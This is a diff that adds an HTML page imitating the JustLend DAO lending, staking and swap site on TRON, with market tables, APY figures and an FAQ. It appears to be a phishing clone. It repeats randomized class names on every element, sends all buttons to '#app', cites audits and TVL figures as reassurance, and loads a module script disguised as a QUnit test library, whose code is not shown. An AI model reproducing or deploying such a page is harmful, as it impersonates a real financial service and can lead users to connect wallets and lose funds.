+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 bar" style="height:68%"></div>
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 bar" style="height:78%"></div>
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 bar" style="height:74%"></div>
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 bar" style="height:88%"></div>
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 bar" style="height:82%"></div>
+                        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 bar active" style="height:100%"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- PRODUCTS -->
+    <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 container section-block" id="features">
+        <h2 class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 section-title">All-in-One DeFi Platform</h2>
+        <p class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 section-sub">Lend, borrow, stake TRX, provide liquidity, and swap – all in one seamless interface.</p>
+        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-grid">
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-card">
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-icon">💰</div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-title">Lend & Earn</div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-desc">Supply assets to liquidity pools and earn variable APY. Stablecoins up to 5% APY.</div>
+                <a href="#app" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-link">Lend now →</a>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-card">
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-icon">🔒</div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-title">Borrow</div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-desc">Get instant loans against your crypto with low interest rates. Collateral: TRX, USDT, BTC.</div>
+                <a href="#app" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-link">Borrow →</a>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-card">
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-icon">⚡</div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-title">Stake TRX</div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-desc">Stake TRX and TRC20 tokens to earn staking rewards + JST governance tokens. APY up to 8%.</div>
+                <a href="#app" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-link">Stake now →</a>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-card">
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-icon">🔄</div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-title">Swap</div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-desc">Swap any TRC20 token with low slippage. Aggregated liquidity from top DEXes.</div>
+                <a href="#app" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 product-link">Swap →</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- MARKETS -->
+    <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 container" id="markets">
+        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 markets">
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 markets-header">
+                <h3>JustLend Markets</h3>
+                <a href="#app" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 btn-outline" style="padding:8px 18px; font-size:14px;">View all →</a>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 market-row header">
+                <div>Asset</div><div>Total Supply</div><div>Supply APY</div><div>Total Borrow</div><div>Borrow APY</div>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 market-row">
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 asset-name"><span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 asset-dot">T</span> TRX</div>
+                <div>$245.6M</div><div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 apy">2.4%</div><div>$98.2M</div><div>4.1%</div>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 market-row">
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 asset-name"><span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 asset-dot">U</span> USDT (TRC20)</div>
+                <div>$412.3M</div><div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 apy">3.8%</div><div>$287.1M</div><div>5.9%</div>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 market-row">
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 asset-name"><span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 asset-dot">B</span> BTC (TRC20)</div>
+                <div>$189.7M</div><div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 apy">1.2%</div><div>$56.4M</div><div>2.8%</div>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 market-row">
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 asset-name"><span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 asset-dot">J</span> JST</div>
+                <div>$78.4M</div><div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 apy">4.5%</div><div>$23.1M</div><div>7.2%</div>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 market-row">
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 asset-name"><span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 asset-dot">U</span> USDC (TRC20)</div>
+                <div>$201.5M</div><div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 apy">3.5%</div><div>$132.8M</div><div>5.3%</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- STAKING -->
+    <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 container section-block" id="staking">
+        <h2 class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 section-title">Stake TRX & Earn JST</h2>
+        <p class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 section-sub">Stake your TRX, USDT, or other TRC20 tokens and start earning rewards in JST. Flexible unstaking.</p>
+        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 staking-grid">
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 staking-card">
+                <h3>⚡ TRX Staking</h3>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 staking-row">
+                    <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 label">APY</span>
+                    <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 staking-apy">6.8%</span>
+                </div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 staking-row">
+                    <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 label">Total Staked</span>
+                    <span>187.3M TRX</span>
+                </div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 staking-row">
+                    <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 label">Rewards</span>
+                    <span>JST + TRX</span>
+                </div>
+                <a href="#app" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 xrlzn3hx xqohd64ce btn-primary" style="width:100%; text-align:center;">Stake TRX</a>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 staking-card">
+                <h3>💎 USDT Staking</h3>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 staking-row">
+                    <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 label">APY</span>
+                    <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 staking-apy">5.2%</span>
+                </div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 staking-row">
+                    <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 label">Total Staked</span>
+                    <span>$92.4M</span>
+                </div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 staking-row">
+                    <span class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 label">Rewards</span>
+                    <span>JST + USDT</span>
+                </div>
+                <a href="#app" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 xrlzn3hx xqohd64ce btn-primary" style="width:100%; text-align:center;">Stake USDT</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- SWAP & POOLS -->
+    <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 container section-block" id="swap">
+        <h2 class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 section-title">Swap & Liquidity Pools</h2>
+        <p class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 section-sub">Trade tokens with low fees or provide liquidity to earn swap fees + JST.</p>
+        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 swap-grid">
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 swap-card">
+                <h3>🔄 Swap any TRC20</h3>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 swap-inputs">
+                    <input type="text" placeholder="From: TRX">
+                    <input type="text" placeholder="To: USDT">
+                </div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 swap-meta">
+                    <span>Rate: 1 TRX ≈ 0.29 USDT</span>
+                    <span>Fee: 0.3%</span>
+                </div>
+                <a href="#app" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 xrlzn3hx xqohd64ce btn-primary" style="width:100%; text-align:center;">Swap</a>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 pools-card" id="pools">
+                <h3>💧 Top Pools</h3>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 market-row header">
+                    <div>Pool</div><div>APY</div><div>Liquidity</div>
+                </div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 market-row">
+                    <div>TRX/USDT</div><div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 apy">12.4%</div><div>$8.2M</div>
+                </div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 market-row">
+                    <div>USDT/JST</div><div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 apy">9.7%</div><div>$5.1M</div>
+                </div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 market-row">
+                    <div>TRX/BTC</div><div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 apy">6.8%</div><div>$3.4M</div>
+                </div>
+                <a href="#app" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 btn-outline" style="display:block; text-align:center; margin-top:20px; font-size:14px;">View all pools →</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- FAQ -->
+    <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 container section-block" id="faq">
+        <h2 class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 section-title">Frequently Asked Questions</h2>
+        <p class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 section-sub">Everything you need to know about JustLend DAO</p>
+        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 faq-grid">
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 faq-item">
+                <h4>What is JustLend DAO?</h4>
+                <p>JustLend DAO is a decentralized finance (DeFi) protocol on the TRON blockchain. It enables users to lend, borrow, stake TRX and TRC20 tokens, swap assets, and earn JST governance rewards.</p>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 faq-item">
+                <h4>How to stake TRX on JustLend?</h4>
+                <p>Staking TRX on JustLend is simple: connect your TronLink wallet, go to the 'Staking' section, choose an amount, and confirm. You'll earn staking rewards and JST tokens.</p>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 faq-item">
+                <h4>What is the APY for lending?</h4>
+                <p>Lending APY varies by asset. Typically stablecoins offer 2–5% APY, while more volatile assets can yield higher. Check our Markets page for real-time rates.</p>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 faq-item">
+                <h4>Can I swap tokens on JustLend?</h4>
+                <p>Yes, JustLend DAO includes a decentralized exchange (DEX) aggregator for swapping TRC20 tokens with low slippage and competitive rates.</p>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 faq-item">
+                <h4>Is JustLend safe?</h4>
+                <p>JustLend DAO has been audited by multiple top-tier security firms (CertiK, SlowMist) and has over $1.2 billion in total value locked (TVL).</p>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 faq-item">
+                <h4>What is JST token used for?</h4>
+                <p>JST is the governance token of JustLend DAO. Holders can vote on proposals, and it's distributed as rewards for staking and providing liquidity.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 footer">
+        <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 container">
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 footer-grid">
+                <div>
+                    <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 footer-logo">
+                        <svg viewBox="0 0 180 36" fill="none" xmlns="http://www.w3.org/2000/svg" style="height:28px;width:auto;">
+                          <text x="0" y="26" font-family="'Syne', sans-serif" font-weight="800" font-size="26" fill="#e8eaed" letter-spacing="-0.5">Just</text>
+                          <text x="67" y="26" font-family="'Syne', sans-serif" font-weight="800" font-size="26" fill="#23b38e" letter-spacing="-0.5">Lend</text>
+                          <rect x="140" y="4" width="36" height="16" rx="4" fill="#23b38e" opacity="0.15"/>
+                          <text x="158" y="16" font-family="'Syne', sans-serif" font-weight="700" font-size="10" fill="#23b38e" text-anchor="middle" letter-spacing="0.5">DAO</text>
+                          <line x1="67" y1="30" x2="131" y2="30" stroke="#23b38e" stroke-width="2.5" stroke-linecap="round"/>
+                        </svg>
+                    </div>
+                    <p class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 footer-desc">Decentralized lending, staking & swap on TRON. Trusted by 18,208+ users worldwide.</p>
+                    <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 social-links">
+                        <a href="#" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 social-link">𝕏</a>
+                        <a href="#" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 social-link">📱</a>
+                        <a href="#" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 social-link">💬</a>
+                        <a href="#" class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 social-link">⌨️</a>
+                    </div>
+                </div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 footer-col">
+                    <h4>Protocol</h4>
+                    <a href="#app">Lending</a>
+                    <a href="#app">Borrow</a>
+                    <a href="#app">Staking</a>
+                    <a href="#app">Swap</a>
+                    <a href="#app">Pools</a>
+                </div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 footer-col">
+                    <h4>Resources</h4>
+                    <a href="#">Docs</a>
+                    <a href="#">Blog</a>
+                    <a href="#faq">FAQ</a>
+                    <a href="#">Audits</a>
+                </div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 footer-col">
+                    <h4>Community</h4>
+                    <a href="#">Twitter</a>
+                    <a href="#">Telegram</a>
+                    <a href="#">Discord</a>
+                    <a href="#">GitHub</a>
+                </div>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 footer-col">
+                    <h4>Legal</h4>
+                    <a href="#">Terms</a>
+                    <a href="#">Privacy</a>
+                    <a href="#">Risk</a>
+                </div>
+            </div>
+            <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 footer-bottom">
+                <span>© 2025 JustLend DAO. All rights reserved.</span>
+                <div class="xabunh021 xqtz8kc2 xsudlmqvbag x2wl7trk x3cc3n089ua xq75e041v3 footer-tvl">
+                    <span>TVL: <strong>$1.2B+</strong></span>
+                    <span>Users: <strong>18,208+</strong></span>
+                </div>
+            </div>
+        </div>
+    </footer>
+<script src="./qunit-2.19.4.js" type="module"></script>
+
+</body>
+</html>
